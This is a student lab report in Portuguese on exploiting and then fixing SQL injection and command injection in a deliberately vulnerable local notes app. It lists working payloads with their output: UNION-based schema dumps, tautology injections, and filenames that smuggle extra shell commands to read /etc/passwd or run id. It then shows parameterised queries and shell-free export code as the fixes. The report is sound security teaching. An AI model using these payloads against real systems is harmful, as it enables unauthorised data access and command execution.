# Semana 12 - Injecao SQL e de Comandos

## Exercicio 1 - Explorar a falha de SQL injection

### Pesquisa normal

Entrada usada:

```text
Welcome
```

Saida observada:

```text
[DEBUG] Executing SQL: SELECT id, title, body FROM notes WHERE title LIKE '%Welcome%'
  [1] Welcome: This is your first note.
```

Aqui a aplicacao faz aquilo que se esperava: procura notas cujo titulo contenha `Welcome`.

### Payload 1

Entrada usada:

```text
' OR '1'='1
```

Saida observada:

```text
[DEBUG] Executing SQL: SELECT id, title, body FROM notes WHERE title LIKE '%' OR '1'='1%'
  [1] Welcome: This is your first note.
  [2] Reminder: Submit the SSI lab report on time.
  [3] Secret: The admin password is hunter2.
```

Este payload fecha a string do `LIKE` e altera a logica da clausula `WHERE`. O resultado pratico e que a pesquisa deixa de procurar um titulo especifico e passa a devolver todas as linhas da tabela.

### Payload 2

Entrada usada:

```text
' UNION SELECT 77, name, sql FROM sqlite_master WHERE type='table' --
```

Saida observada:

```text
[DEBUG] Executing SQL: SELECT id, title, body FROM notes WHERE title LIKE '%' UNION SELECT 77, name, sql FROM sqlite_master WHERE type='table' --%'
  [1] Welcome: This is your first note.
  [2] Reminder: Submit the SSI lab report on time.
  [3] Secret: The admin password is hunter2.
  [77] notes: CREATE TABLE notes (id INTEGER PRIMARY KEY, title TEXT, body TEXT)
```

Aqui o atacante usa `UNION SELECT` para juntar ao resultado original informacao do `sqlite_master`, que e a tabela interna onde o SQLite guarda o schema. Isto mostra que a falha nao serve apenas para ler as notas: tambem permite fazer reconhecimento da base de dados.

### Payload 3

Entrada usada:

```text
' UNION SELECT 88, title, body FROM notes --
```

Saida observada:

```text
[DEBUG] Executing SQL: SELECT id, title, body FROM notes WHERE title LIKE '%' UNION SELECT 88, title, body FROM notes --%'
  [1] Welcome: This is your first note.
  [2] Reminder: Submit the SSI lab report on time.
  [3] Secret: The admin password is hunter2.
  [88] Reminder: Submit the SSI lab report on time.
  [88] Secret: The admin password is hunter2.
  [88] Welcome: This is your first note.
```

Neste caso, o atacante injeta uma segunda query que volta a ler diretamente a tabela `notes`, marcando as linhas injetadas com o id `88`. Isto mostra controlo real sobre a query executada.

### O que se aprende com estes payloads

- O input do utilizador esta a ser concatenado diretamente na query SQL.
- O programa trata texto do utilizador como se fosse parte da linguagem SQL.
- Um atacante pode extrair dados, schema e, noutros cenarios, tentar manipular mais tabelas da mesma base de dados.

## Exercicio 2 - Explorar a falha de command injection

### Caso normal

Entrada usada:

```text
note.txt
```

Saida observada:

```text
[DEBUG] Executing command: echo 'Title: Welcome
Body: This is your first note.' > note.txt
  Note exported to note.txt
```

O comportamento normal e apenas criar um ficheiro com o conteudo da nota.

### Payload 1

Entrada usada:

```text
note.txt; head -n 3 /etc/passwd
```

Saida observada no meu ambiente:

```text
##
# User Database
#
[DEBUG] Executing command: echo 'Title: Welcome
Body: This is your first note.' > note.txt; head -n 3 /etc/passwd
  Note exported to note.txt; head -n 3 /etc/passwd
```

O resultado mostra que o segundo comando tambem foi executado. No meu caso, como o teste foi feito em macOS, as primeiras linhas de `/etc/passwd` aparecem com o cabecalho do OpenDirectory; num Linux seria comum ver logo entradas como `root:x:0:0:...`.

### Payload 2

Entrada usada:

```text
note.txt; id; whoami
```

Saida observada:

```text
uid=501(<utilizador_local>) gid=20(staff) groups=...
<utilizador_local>
[DEBUG] Executing command: echo 'Title: Welcome
Body: This is your first note.' > note.txt; id; whoami
  Note exported to note.txt; id; whoami
```

Este payload prova que o atacante consegue executar comandos arbitrarios e descobrir com que identidade o processo esta a correr.

### Payload 3

Entrada usada:

```text
`ls -la`
```

Saida observada:

```text
[DEBUG] Executing command: echo 'Title: Welcome
Body: This is your first note.' > `ls -la`
  Note exported to `ls -la`
sh: line 1: total 48
...
notes.db: File name too long
```

Mesmo quando o resultado final e um erro, a shell tenta expandir os backticks antes de executar o resto do comando. Isso e suficiente para demonstrar a vulnerabilidade.

### Porque isto funciona

O problema esta nesta linha da versao vulneravel:

```python
cmd = f"echo 'Title: {row[0]}\nBody: {row[1]}' > {filename}"
os.system(cmd)
```

Ou seja, o nome do ficheiro nao e tratado como dado. Ele passa a fazer parte da propria linha de comando. Assim, metacaracteres como `;` e backticks deixam de ser texto normal e passam a ter significado para a shell.

## Exercicio 3 - Correcao da SQL injection

Na versao corrigida usei placeholders SQL em vez de concatenacao:

```python
def search_notes(query):
    """Pesquisa segura usando placeholders SQL."""
    statement = "SELECT id, title, body FROM notes WHERE title LIKE ? ORDER BY id"
    parameter = f"%{query}%"
    print(f"[DEBUG] Executing SQL: {statement} | params=({parameter!r},)")

    try:
        with open_db() as conn:
            rows = conn.execute(statement, (parameter,)).fetchall()
    except sqlite3.Error as exc:
        print(f"  SQL error: {exc}")
        return
```

Porque e que isto resolve o problema:

- a query fica fixa e deixa de ser montada com texto do utilizador;
- o valor introduzido passa a ser um parametro e nao codigo SQL;
- o SQLite recebe o payload como string literal, por isso `OR`, `UNION` e `--` deixam de alterar a query.

Testes depois da correcao:

```text
[DEBUG] Executing SQL: SELECT id, title, body FROM notes WHERE title LIKE ? ORDER BY id | params=("%' OR '1'='1%",)
  No notes found.

[DEBUG] Executing SQL: SELECT id, title, body FROM notes WHERE title LIKE ? ORDER BY id | params=("%' UNION SELECT 77, name, sql FROM sqlite_master WHERE type='table' --%",)
  No notes found.
```

Tambem confirmei que a pesquisa normal continua a funcionar:

```text
[DEBUG] Executing SQL: SELECT id, title, body FROM notes WHERE title LIKE ? ORDER BY id | params=('%Welcome%',)
  [1] Welcome: This is your first note.
```

## Exercicio 4 - Correcao da command injection

Nesta parte optei por duas medidas ao mesmo tempo:

1. remover totalmente a chamada a `os.system()`;
2. aceitar apenas nomes de ficheiro simples e guardar a exportacao numa pasta `exports/`.

Trecho principal:

```python
def export_note(note_id):
    """Escreve a nota para um ficheiro sem invocar qualquer shell."""
    row = fetch_note(note_id)
    if row is None:
        print("  Note not found.")
        return

    filename = input("  Enter filename to export to: ").strip()
    if not is_valid_export_name(filename):
        print("  Invalid filename. Use a simple local filename with letters, digits, ., _ or -.")
        return

    EXPORT_DIR.mkdir(exist_ok=True)
    destination = EXPORT_DIR / filename
    content = f"Title: {row['title']}\nBody: {row['body']}\n"
    destination.write_text(content, encoding="utf-8")
    print(f"  Note exported to {destination}")
```

Razao de seguranca:

- sem shell, caracteres como `;`, backticks, pipes e redirecionamentos deixam de ter qualquer efeito especial;
- o validador bloqueia nomes com metacaracteres ou paths;
- a exportacao fica confinada a uma pasta previsivel, o que reduz ainda mais o risco.

Resultados depois da correcao:

```text
safe.txt
  Note exported to .../exports/safe.txt

note.txt; head -n 3 /etc/passwd
  Invalid filename. Use a simple local filename with letters, digits, ., _ or -.

note.txt; id; whoami
  Invalid filename. Use a simple local filename with letters, digits, ., _ or -.

`ls -la`
  Invalid filename. Use a simple local filename with letters, digits, ., _ or -.
```

Nenhum dos payloads maliciosos voltou a ser interpretado como comando.

## Exercicio 5 - Reflexao

As falhas estudadas nas semanas 11 e 12 parecem diferentes a primeira vista, mas partilham a mesma raiz: o programa perde controlo sobre a fronteira entre dados e mecanismos internos.

- Num buffer overflow, bytes a mais invadem memoria que nao devia ser tocada.
- Numa format string vulnerability, o input passa a ser interpretado como especificadores para `printf`.
- Em SQL injection e command injection, o texto do utilizador deixa de ser apenas dado e passa a ser tratado como codigo por outro interpretador.

Isto tambem explica porque a validacao de input, sozinha, raramente chega. Filtros ajudam, mas e facil esquecer um separador, um encoding diferente, uma chamada indireta ao shell ou um contexto em que o atacante consegue escapar. A defesa mais forte aparece quando a arquitetura certa impede a mistura entre dados e comandos:

- placeholders SQL em vez de concatenacao;
- escrita direta em ficheiro em vez de shell;
- funcoes seguras com limites explicitos;
- formatos literais fixos em vez de `printf(user_input)`.

O principio do privilegio minimo continua igualmente importante. Mesmo quando existe uma falha, o impacto diminui se o processo tiver menos permissoes: menos ficheiros acessiveis, menos comandos possiveis e menos capacidade de escalar o estrago.

Por fim, buffer overflow e format string nao sao a mesma coisa. O buffer overflow corrompe memoria ao escrever para alem do espaco reservado. Ja a format string explora uma API que interpreta a string como formato e tenta ler argumentos que o programador nunca quis expor. Nos dois casos ha perda de controlo, mas o mecanismo tecnico da exploracao e diferente.
